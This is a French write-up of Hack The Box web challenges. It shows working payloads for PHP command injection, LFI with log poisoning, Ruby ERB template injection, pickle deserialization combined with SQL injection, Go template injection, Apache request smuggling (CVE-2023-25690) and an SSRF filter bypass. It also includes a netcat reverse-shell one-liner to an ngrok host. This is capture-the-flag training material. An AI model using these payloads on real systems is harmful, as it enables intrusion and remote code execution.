# Challenges Web HTB

## LoveTok

La page principale est une URL terminant par "/?format=r" et il semble possible de faire varier ce format, notamment en y mettant des données non-prévues. Cela semble être un point d'entrée pour une injection.

Impossible d'utiliser les caractères suivants à cause de la fonction addslashes() utilisée sur le format dans le code source : 
- '
- "
- \

Impossible d'utiliser de l'encodage puisque la variable $_GET[] va décoder le payload avant de le passer à TimeModel() : 

    $format = isset($_GET['format'])? $_GET['format'] : 'r';
    $time = new TimeModel($format);


Il reste donc l'option des variables complexes : 

    ${system($_GET[commande])}&commande=ls+/
    ${system($_GET[commande])}&commande=cat+/flag

## Toxic 

Dans la page **index.php** on observe que le cookie de session est généré à partir d'un nom de fichier. Ce nom de fichier est sérialisé et combiné avec un calcul : 

    if (empty($_COOKIE['PHPSESSID']))
    {
        $page = new PageModel;
        $page->file = '/www/index.html';

        setcookie(
            'PHPSESSID', 
            base64_encode(serialize($page)), 
            time()+60*60*24, 
            '/'
        );
    } 

En faisant une requête classique on peut récupérer un cookie au format traditionnel : 

>Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9

Le décodage en Base64 de cette valeur donne le résultat suivant : 

    O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

En remplaçant "**/www/index.html**" par "**/etc/passwd**" puis en réencodant en Base64 on obtient bien le contenu de ce fichier. **Attention à bien mettre à jour le champ "s" qui précède le chemin avec la bonne longueur !**

Exemple de payload en clair : 

    O:9:"PageModel":1:{s:4:"file";s:34:"../../../../../../../../etc/passwd";}

Il faudrait adapter ce payload pour lire le flag directement, mais le nom du flag est généré dynamiquement et n'est pas devinable. On doit donc trouver une RCE.

Le titre du challenge fait directement penser au Log Poisoning et le cas de figure LFI => Log Poisoning => RCE est très connu. Je suis donc parti sur cette voie : 

    O:9:"PageModel":1:{s:4:"file";s:48:"../../../../../../../../var/log/nginx/access.log";}
    
Ce payload encodé en Base64 fonctionne et nous sort les logs du serveur. L'user-agent est bien reflété dedans, on peut donc refaire des requêtes classiques mais cette fois avec les valeurs suivantes dans le header "User-Agent" : 

    <?php system('id'); ?>
    <?php system('ls /'); ?>
    <?php system('cat /flag_K61S1'); ?>

## Neonify 

Le site ne contient qu'une simple page permettant de renvoyer du texte en version fluo. 

Dans le code source de cette page on remarque le morceau suivant : 

    <h1 class="glow"><%= @neon %></h1>
    
Cela ressemble à un point d'entrée pour une SSTI. 

Toutefois, la plupart des payloads classiques de SSTI sont rejetés. En vérifiant le code source du back-end, on observe un filtre par expression régulière : 

    post '/' do
        if params[:neon] =~ /^[0-9a-z ]+$/i
          @neon = ERB.new(params[:neon]).result(binding)
        else
          @neon = "Malicious Input Detected"
        end
        erb :'index'
      end

Utiliser '^' et '$' comme délimiteurs en Ruby est une erreur, puisqu'ils s'arrêtent à la ligne courante et peuvent être contournés par les retours à la ligne.

Voir : https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/

Payload en clair contenant un retour à la ligne et une commande de lecture du flag : 

    ABCDE\n
    <%= File.open('flag.txt').read %>
    
Attention à bien encoder tous les caractères spéciaux et notamment le retour à la ligne.

Payload final : 

    ABCDE%0a
    <%25%3d+File.open('flag.txt').read+%25>

## C.O.P

La cible semble être un simple site marchand avec des références à Pickle.

Dans le fichier **database.py** on voit que le site utilise la fonction **pickle.dumps()** qui peut être vulnérable à des attaques par désérialisation : 

    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))

Dans le fichier **models.py** on voit également une injection SQL classique : 

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

Exemple de script Python pour automatiser la génération du payload : 

    import sys
    import base64
    import pickle
    import urllib.parse
    import requests

    class Payload:
    
      def __reduce__(self):
        import os
        cmd = ("$COMMANDE")
        return os.system, (cmd,)

    if __name__ == "__main__":
      payload = base64.b64encode(pickle.dumps(Payload())).decode()
      payload = f"' UNION SELECT '{payload}' -- "
      payload = requests.utils.requote_uri(payload)
      print(payload)

Suite de payloads à utiliser : 

    ping kvj6lchz2mo961drc3g2duq2ut0kofc4.oastify.com
    mkfifo /tmp/p; nc $NGROK $PORT 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p

## RenderQuest

Le site permet d'injecter des templates à partir d'autres sites.

Le code est en Go et tout est dans le fichier **main.go** 

On trouve une fonction extrêmement intéressante dedans : 

    func (p RequestData) FetchServerInfo(command string) string {
        out, err := exec.Command("sh", "-c", command).Output()
        if err != nil {
            return ""
        }
        return string(out)
    }
    
Quelques utilisations de cette fonction se trouvent plus bas dans le code : 

	reqData.ServerInfo.Hostname = reqData.FetchServerInfo("hostname")
	reqData.ServerInfo.OS = reqData.FetchServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
	reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo("uname -r")
	reqData.ServerInfo.Memory = reqData.FetchServerInfo("free -h | awk '/^Mem/{print $2}'")
    
    
Comme le site utilise des templates, il est sûrement possible d'injecter cette fonction dans un template.


Le site https://webhook.site permet de créer un webhook avec réponses personnalisables.

En mettant **{{.FetchServerInfo "ls"}}** comme réponse dans notre webhook on a bien le retour de la commande lorsque l'on visite la page suivante : 

    http://94.237.54.37:39179/render?use_remote=true&page=https://webhook.site/eefae61c-61f7-424a-9e8c-ce53c112956b

Exemples de payloads à mettre dans les réponses du webhook pour obtenir le flag : 

    {{.FetchServerInfo "ls /"}}
    {{.FetchServerInfo "cat /flag28c66c9c92.txt"}}

Il est important de mettre le point avant la fonction sinon le site plante et retourne une erreur 500.

## ApacheBlaze

On arrive sur un site présentant 4 jeux différents mais qui ne semblent pas disponibles.

Dans le fichier **app.py**, qui constitue l'entièreté du backend, on trouve la condition nécessaire pour obtenir le flag : 

    elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
            
Dans le fichier **httpd.conf** on observe deux virtual hosts : 

    <VirtualHost *:1337>

        ServerName _

        DocumentRoot /usr/local/apache2/htdocs

        RewriteEngine on

        RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
        ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"

    </VirtualHost>

    <VirtualHost *:8080>

        ServerName _

        ProxyPass / balancer://mycluster/
        ProxyPassReverse / balancer://mycluster/

        <Proxy balancer://mycluster>
            BalancerMember http://127.0.0.1:8081 route=127.0.0.1
            BalancerMember http://127.0.0.1:8082 route=127.0.0.1
            ProxySet stickysession=ROUTEID
            ProxySet lbmethod=byrequests
        </Proxy>

    </VirtualHost>
    
    
En interceptant une requête avec Burp et en essayant naïvement de modifier le header "X-Forwarded-Host" manuellement, cela ne fonctionne pas :

    X-Forwarded-Host: dev.apacheblaze.local

En essayant avec Curl en mode verbeux et en local, on peut voir que des headers sont rajoutés par le serveur, mais c'est logique puisque c'est le comportement par défaut de mod_proxy_http.

Toutefois, un CVE bien connu sur Apache permet justement de rajouter des headers arbitraires, et semble correspondre à notre cas de figure ("mod_proxy" activé et présence d'une "RewriteRule" bien spécifique).

Voir : 

- https://access.redhat.com/security/cve/cve-2023-25690
- https://github.com/dhmosfunk/CVE-2023-25690-POC


Payload final : 

    curl "83.136.251.235:34303/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/" 


## ProxyAsAService

Le site permet de rediriger vers d'autres URL. En allant sur le site pour la première fois, on est automatiquement redirigé vers une URL de type "http://83.136.251.235:45235/?url=/r/catvideos/"

Dans le fichier **routes.py** on peut voir que le site renvoie effectivement sur un subreddit de chats si aucune valeur n'est spécifiée dans le paramètre "?url=" :

    @proxy_api.route('/', methods=['GET', 'POST'])
    def proxy():
        url = request.args.get('url')

        if not url:
            cat_meme_subreddits = [
                '/r/cats/',
                '/r/catpictures',
                '/r/catvideos/'
            ]

            random_subreddit = random.choice(cat_meme_subreddits)

            return redirect(url_for('.proxy', url=random_subreddit))

        target_url = f'http://{SITE_NAME}{url}'
        response, headers = proxy_req(target_url)

        return Response(response.content, response.status_code, headers.items())

Cela ressemble à un scénario de SSRF.

Dans le fichier **util.py** on peut voir une petite couche de sanitization : 

    RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

    def is_safe_url(url):
        for restricted_url in RESTRICTED_URLS:
            if restricted_url in url:
                return False
        return True

    def is_from_localhost(func):
        @functools.wraps(func)
        def check_ip(*args, **kwargs):
            if request.remote_addr != '127.0.0.1':
                return abort(403)
            return func(*args, **kwargs)
        return check_ip

On voit que ni les caractères '@', ni l'adresse "0.0.0.0" ne sont filtrés, on peut donc utiliser une combinaison de ces deux techniques pour contourner les filtres. 

On devrait donc pouvoir accéder à l'environnement, qui est censé être réservé au serveur en local : 

    @debug.route('/environment', methods=['GET'])
    @is_from_localhost
    def debug_environment():
        environment_info = {
            'Environment variables': dict(os.environ),
            'Request headers': dict(request.headers)
        }

        return jsonify(environment_info)

Grâce au fichier **run.py** on sait que le port utilisé par l'application est 1337.
        
URL finale à forger : 

    http://83.136.251.235:45235/?url=@0.0.0.0:1337/debug/environment
    
Le flag se trouve dans une des variables d'environnement.
